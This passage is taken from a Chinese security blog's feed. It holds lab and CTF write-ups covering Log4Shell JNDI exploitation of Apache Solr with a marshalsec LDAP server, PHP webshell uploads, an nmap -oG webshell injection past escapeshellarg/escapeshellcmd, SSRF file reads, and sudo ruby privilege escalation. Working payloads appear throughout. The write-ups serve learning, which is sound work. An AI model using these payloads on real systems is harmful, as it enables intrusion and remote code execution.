-d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:8983</code>即可查看到Apache Solr的后台页面。可以看到这就是<br>Apache Solr 是一个可以作为服务运行的应用程序。它通常以服务器模式运行，接受来自客户端的搜索请求，并返回搜索结果。Solr 提供了一个 HTTP 接口，可以通过 RESTful API 进行操作。这使得 Solr 可以方便地与其他应用程序集成，通过 Web 请求进行数据索引和搜索查询。</p><p>Solr 还支持配置为集群模式，以处理大规模的数据和高负载的搜索请求。它具有许多功能，如分布式搜索、实时索引、负载均衡和自动故障转移，适用于大规模和高性能的搜索需求</p><h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>一般验证都是用dnslog </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:dns://<span class="variable">$&#123;sys:java.version&#125;</span>.example.com&#125;</span></span><br></pre></td></tr></table></figure><p>在 Log4j 中，<code>$&#123;sys:java.version&#125;</code> 是一种使用变量替换的语法，用于在日志配置文件中插入动态值。</p><ul><li><code>$&#123;sys:java.version&#125;</code> 是一个占位符，表示 Log4j 会用实际的系统属性值来替换它。</li><li><code>sys</code> 表示这是一个系统属性的占位符。</li><li><code>java.version</code> 是要替换的具体系统属性的名称。</li></ul><p>在这个例子中，<code>java.version</code> 是一个 Java 系统属性，它包含了当前运行的 Java 版本信息。Log4j 会在解析配置文件时用这个系统属性的实际值替换 <code>$&#123;sys:java.version&#125;</code>。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811221326.png" alt="image.png"><br>此时我们的环境已经起来了，可以看到这个就是solar admin系统。我们需要找到log4j记录的地方，</p><h4 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h4><p>在 Apache Solr 中，<code>/solr/admin/cores</code> 是 Solr 的一个管理路径，用于操作和管理 Solr 的“cores”（核心）。以下是这个路径的主要用途：</p><h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a><strong>主要功能</strong></h3><ol><li><p><strong>列出核心</strong>:</p><ul><li>访问 <code>http://&lt;host&gt;:&lt;port&gt;/solr/admin/cores?action=STATUS</code> 可以查看当前 Solr 实例中的所有核心及其状态。</li></ul></li><li><p><strong>查看核心状态</strong>:</p><ul><li>提供核心的运行状态、配置信息和统计数据，帮助监控和管理 Solr 的各个核心。</li></ul></li><li><p><strong>管理核心</strong>:</p><ul><li>通过这个路径，你可以执行各种管理操作，比如重新加载、卸载、创建新核心等。例如：<ul><li><code>http://&lt;host&gt;:&lt;port&gt;/solr/admin/cores?action=RELOAD&amp;core=&lt;core_name&gt;</code> 用于重新加载指定核心。</li><li><code>http://&lt;host&gt;:&lt;port&gt;/solr/admin/cores?action=UNLOAD&amp;core=&lt;core_name&gt;</code> 用于卸载指定核心。</li></ul></li></ul></li></ol><h3 id="示例使用"><a href="#示例使用" class="headerlink" title="示例使用"></a><strong>示例使用</strong></h3><ul><li><p><strong>列出所有核心</strong>:</p><p>  Copy Code</p><p>  <code>http://&lt;host&gt;:&lt;port&gt;/solr/admin/cores?action=STATUS</code></p><p>  这将返回一个 JSON 格式的响应，包含所有核心的详细状态信息。</p></li><li><p><strong>重新加载核心</strong>:</p><p>  Copy Code</p><p>  <code>http://&lt;host&gt;:&lt;port&gt;/solr/admin/cores?action=RELOAD&amp;core=my_core</code></p><p>  这将重新加载名为 <code>my_core</code> 的核心，适用于配置变更后需要重新加载核心的情况。</p></li></ul><h3 id="如何访问"><a href="#如何访问" class="headerlink" title="如何访问"></a><strong>如何访问</strong></h3><p>确保 Solr 实例正在运行，并且你能够通过指定的主机和端口访问 Solr。访问 <code>/solr/admin/cores</code> 可以帮助你进行核心的监控和管理工作，是 Solr 系统管理中的重要一环。</p><p>Solr 的查询记录和其他重要事件通常会被记录在 log4j 日志中。Solr 使用 log4j 进行日志记录，具体的日志记录位置和详细程度可以通过 log4j 配置文件进行设置。查询记录、错误信息、系统状态等会被写入到指定的日志文件中，帮助你监控和调试 Solr 实例。通过这一点，我们可以触发${}进行替换触发。</p><h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><h5 id="dnslog验证"><a href="#dnslog验证" class="headerlink" title="dnslog验证"></a>dnslog验证</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:dns://$&#123;sys:java.version&#125;.45046de8.log.dnslog.biz.&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811230754.png" alt="image.png"><br>很明显利用成功。<br>既然证明存在现在我们的想法肯定是想利用ldap服务器进行一个rce，因为jndi查询服务不仅可以查询dns服务还可以查询ldap服务。ldap又可以访问我们的web服务。从而让服务器下载对应的恶意web<br>java class文件从而执行</p><h5 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h5><h6 id="准备恶意文件"><a href="#准备恶意文件" class="headerlink" title="准备恶意文件"></a>准备恶意文件</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.com.test;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4j</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">log4j</span> <span class="variable">exploit</span> <span class="operator">=</span> <span class="keyword">new</span>  <span class="title class_">log4j</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">log4j</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p><strong><code>Runtime.getRuntime().exec(&quot;calc&quot;);</code></strong>:</p><ul><li><code>Runtime.getRuntime()</code> 返回当前应用程序的运行时对象，该对象允许应用程序与运行环境进行交互。</li><li><code>exec(&quot;calc&quot;)</code> 方法用于执行指定的系统命令。在 Windows 操作系统上，<code>&quot;calc&quot;</code> 是启动计算器的命令。因此，这行代码试图启动计算器应用程序。</li><li>如果你在其他操作系统上运行这个代码（比如 macOS 或 Linux），<code>&quot;calc&quot;</code> 可能不会有任何效果，因为计算器的命令在不同操作系统上是不同的。</li></ul></li><li><p><strong><code>catch (IOException e)</code></strong>:</p><ul><li><code>IOException</code> 是一个异常，表示在输入或输出操作中发生了问题。在这里，它用于捕获 <code>exec</code> 方法可能抛出的异常（例如命令无法执行或文件无法找到）。</li><li><code>e.printStackTrace();</code> 用于打印异常的堆栈跟踪，以帮助调试和找出错误的具体</li></ul></li></ol><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811232320.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240814224511.png" alt="image.png"><br>先开启一个web服务 ，之后利用工具创建ldap服务器之后开始攻击。</p><h5 id="准备ldap"><a href="#准备ldap" class="headerlink" title="准备ldap"></a>准备ldap</h5><p>我们需要使用jndi找到ldap服务，之后使用ldap的功能去访问我们的web服务器。</p><table><thead><tr><th>完事具备就差ldap服务器</th><th><a href="marshalsec.md#**%E5%BC%80%E5%90%AFLDAP%E6%9C%8D%E5%8A%A1">**开启LDAP服务</a></th></tr></thead></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:1234/#log4j 1389</span><br></pre></td></tr></table></figure><p>这个可以直接确定ldap端口和ldap响应的url<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240814225636.png" alt="image.png"><br>我们必须在class文件中省略 class后缀只能用#名字<br>Listening on 0.0.0.0:1389<br>已经启动此时我们需要直接触发链条</p><h4 id="payload"><a href="#payload" class="headerlink" title="***payload"></a>***payload</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap://127.0.0.1:1389&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf刷题记录4</title>
      <link href="/2024/07/28/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/"/>
      <url>/2024/07/28/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240728182336.png" alt="image.png"></p><h3 id="LitCTF-2023-作业管理系统"><a href="#LitCTF-2023-作业管理系统" class="headerlink" title="[LitCTF 2023]作业管理系统"></a>[LitCTF 2023]作业管理系统</h3><blockquote><p>交作业！！但是哪里不对？<br>出题人 探姬</p></blockquote><blockquote><p>第一眼 登陆框 必然是试一试 弱口令<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240715235151.png" alt="image.png"></p></blockquote><p>可以看到包是admin:admin的啊,之后在源代码也看到了 一个 admin admin 猜想没错<br>进入之后 很多功能点啊 </p><p>直接文件上传 php木马 没想到这么简单<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240715235500.png" alt="image.png"></p><h6 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post参数</span><br><span class="line">cmd=system(&#x27;cat /flag*&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h3><p>拿到了一个xls，一般这种办公软件里面第一步就是查一些字符串</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726214723.png" alt="image.png"><br>果然第一条就看到一个flag.txt，同时我们知道其实这种xls的文件基本都是一些zip压缩包格式<br>你打开文件格式看看也会发现他就是个zip文件格式，修改成zip后缀之后就可以根据目录找到flag<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726215110.png" alt="image.png"></p><h3 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h3><p>直接修改宽高，将高拉长<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726222622.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726222533.png" alt="image.png"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="variable">$host </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];   </span><br><span class="line">    <span class="variable">$host </span>= <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);   </span><br><span class="line">    <span class="variable">$host </span>= <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);  </span><br><span class="line">    <span class="variable">$sandbox </span>= <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;  </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);  </span><br><span class="line">    <span class="keyword">echo</span><span class="title function_ invoke__"> system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">```text</span><br><span class="line">单引号 (&#x27;)：转义为 \&#x27;。</span><br><span class="line">双引号 (&quot;)：转义为 \&quot;。</span><br><span class="line">反斜杠 (\)：转义为 \\。</span><br><span class="line">美元符号 ($)：转义为 \$。</span><br><span class="line">反引号 (`)：转义为 ``````。</span><br><span class="line">感叹号 (!)：转义为 \!。</span><br><span class="line">分号 (;)：转义为 \;。</span><br><span class="line">大于号 (&gt;)：转义为 \&gt;。</span><br><span class="line">小于号 (&lt;)：转义为 \&lt;。</span><br><span class="line">垂直线 (|)：转义为 \|。</span><br><span class="line">与号 (&amp;)：转义为 \&amp;。</span><br><span class="line">空格 ( )：转义为 \ 。</span><br><span class="line"></span><br><span class="line">传入的参数是：172.17.0.2&#x27; -v -d a=1</span><br><span class="line"></span><br><span class="line">经过escapeshellarg处理后变成了</span><br><span class="line">&#x27;172.17.0.2&#x27;\&#x27;&#x27; -v -d a=1&#x27;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"></span><br><span class="line">经过escapeshellcmd处理后变成&#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</span><br><span class="line">最后执行的命令是curl &#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#x27;，即向172.17.0.2\发起请求，POST 数据为a=1&#x27;。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])`**:</span><br><span class="line">    </span><br><span class="line">    - 检查是否存在HTTP请求头`X-Forwarded-For`。这个头部通常由代理服务器添加，用于标识客户端的原始IP地址。</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    - 如果`X-Forwarded-For`存在，则将`<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]`设置为其值。通常，`<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]`包含直接连接到服务器的IP地址，而不是原始客户端的IP地址。</span><br></pre></td></tr></table></figure><p>通常在代理服务器上使用xff</p><p>这道题其实这个xff没有用，最主要还是两个php转义函数的绕过，但是问题就出现在<br>system函数里拼接了nmap的指令字符串。nmap中的-oG参数可以将代码与命令写到文件中，比如nmap <?php phpinfo();?> -oG 1.php从而像一个文件包含的日志注入一样</p><h4 id="PAYLOADS"><a href="#PAYLOADS" class="headerlink" title="PAYLOADS"></a>PAYLOADS</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27;127.0.0.1 &lt;?php eval($_POST[&quot;cmd&quot;]);?&gt; -oG 1.php &#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">如果我们直接传入这个，只会被当成字符串无法写入马</span><br><span class="line">那么我们在传入参数的前面添加单引号，后面空格加单引号</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;127.0.0.1 &lt;?php @eval();?&gt; -oG hack.php &#x27;</span></span><br><span class="line"></span><br><span class="line">传进去后变成</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>();<span class="meta">?&gt;</span> -oG hack.php <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">经过escapeshellarg函数处理</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;\&#x27;127.0.0.1 &lt;?php @eval();?&gt; -oG hack.php \&#x27;&#x27;</span></span><br><span class="line"><span class="comment">//在转义的单引号左右添加单引号</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>();<span class="meta">?&gt;</span> -oG hack.php <span class="string">&#x27;\&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">经过escapeshellcmd函数处理</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;127.0.0.1 &lt;?php @eval();?&gt; -oG hack.php &#x27;</span>\\<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">执行结果会对目标\127.0.0.1发送命令&lt;?php @eval();?&gt; -oG hack.php \写入文件</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>注意最后的空格，不然后缀可能发生变化。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_coffeeshop</title>
      <link href="/2024/07/27/hackmyvm-coffeeshop/"/>
      <url>/2024/07/27/hackmyvm-coffeeshop/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:2A:FE:97 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure><p>全端口扫描也只扫描了一个22和一个80,开始识别一些服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 81a4522b143f13682be25bc47bd71aa5 (ECDSA)</span><br><span class="line">|_  256 251909292fb8eab4291f6de713d6be7e (ED25519)</span><br><span class="line"></span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">|_http-title: Under Construction - Midnight Coffee</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line"></span><br><span class="line">MAC Address: 08:00:27:2A:FE:97 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="资产梳理"><a href="#资产梳理" class="headerlink" title="资产梳理"></a>资产梳理</h3><table><thead><tr><th>ssh</th><th>OpenSSH 8.9p1</th></tr></thead><tbody><tr><td>服务器</td><td>Apache httpd 2.4.52 ((Ubuntu))</td></tr><tr><td>OS</td><td>(Ubuntu))</td></tr><tr><td>语言</td><td>php</td></tr></tbody></table><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>一般来讲这种靶机只能慢慢磨web</p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">==&gt; DIRECTORY: http://192.168.2.10/shop/                                                                  </span><br><span class="line">---- Entering directory: http://192.168.2.10/shop/ ----</span><br><span class="line">+ http://192.168.2.10/shop/index.html (CODE:200|SIZE:2577)                                                                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.2.10/shop/stylesheet/                                                                                    </span><br></pre></td></tr></table></figure><p>只看到一个shop的页面 没什么功能点也没接口,只能继续扫目录<br>一个login.php<br><a href="mailto:&#115;&#104;&#x6f;&#112;&#97;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#109;&#x69;&#x64;&#110;&#105;&#x67;&#x68;&#x74;&#46;&#99;&#x6f;&#102;&#102;&#x65;&#101;">shopadmin@midnight.coffee</a>邮箱</p><p>依旧还是老规矩登录框,测试弱口令等<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240725172416.png" alt="image.png"><br>woc真的一点思路都没了</p><h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>由于此时我们无法找到任何有用的信息，所以这个时候看一下子域名,所以此时要配置一下hosts<br>将域名解析成ip了，同时爆破子域名<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726105213.png" alt="image.png"><br>使用了fuzz 成功找到一个dev子域名,由于这是在靶场环境，只能解析为同一个ip但是不同服务.<br>因此还需要在hosts上加上一个解析。访问dev.midnight.coffee 域名可以得到<img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726105606.png" alt="image.png"><br>之后想到之前的login.php，直接登陆得到ssh的账号和密码<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726105742.png" alt="image.png"></p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>**tuna : 1L0v3_TuN4_Very_Much<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726110307.png" alt="image.png"></p><h2 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h2><h4 id="横向提权"><a href="#横向提权" class="headerlink" title="横向提权"></a>横向提权</h4><p>查看&#x2F;etc&#x2F;crontab 我们可以看到有一个shopadmin的定时任务，查看执行脚本之后才发现他执行&#x2F;tmp目录下的所有shell脚本。思路就是反弹一个shopadmin的shell到我们的本地。因此写一个1.sh</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726172113.png" alt="image.png"></p><h4 id="纵向提权"><a href="#纵向提权" class="headerlink" title="纵向提权"></a>纵向提权</h4><p>直接查看sudo 权限<br>***&#x2F;usr&#x2F;bin&#x2F;ruby * &#x2F;opt&#x2F;shop.rb：</p><p>指定允许用户以提升的权限运行的命令或命令集。在这种情况下，它允许用户使用任何参数运行 <code>ruby</code> 解释器，后跟位于 <code>/opt/shop.rb</code> 的脚本。<br>这个就是纯属送分了</p><p>但是这个不符合规定的规则，因此可以看到可以将&#x2F;opt&#x2F;shop.rb 放在后面</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby -e <span class="string">&#x27;exec &quot;/bin/sh&quot;&#x27;</span> /opt/shop.rb</span><br></pre></td></tr></table></figure><p>拿到root_shell  打完收工下机</p>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub_ssrf基础认证</title>
      <link href="/2024/07/21/ctfhub-ssrf%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81-%E7%BC%BA%E9%92%B1%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%89%88/"/>
      <url>/2024/07/21/ctfhub-ssrf%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81-%E7%BC%BA%E9%92%B1%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240721162712.png" alt="image.png"></p><h4 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h4><blockquote><p>  可以看到url 参数部分 出现了熟悉的url 网址访问可以看到可能就是ssrf 的点</p></blockquote><p>**payloads</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/flag</span><br></pre></td></tr></table></figure><p>可以进行内网探测 端口 无果</p><h4 id="伪协议读取"><a href="#伪协议读取" class="headerlink" title="伪协议读取"></a>伪协议读取</h4><p>**payloads</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><blockquote><p>hint:来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p></blockquote><p>**payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1:21</span><br></pre></td></tr></table></figure><p>更换端口去爆破  </p><h4 id="POST传递参数"><a href="#POST传递参数" class="headerlink" title="POST传递参数"></a>POST传递参数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 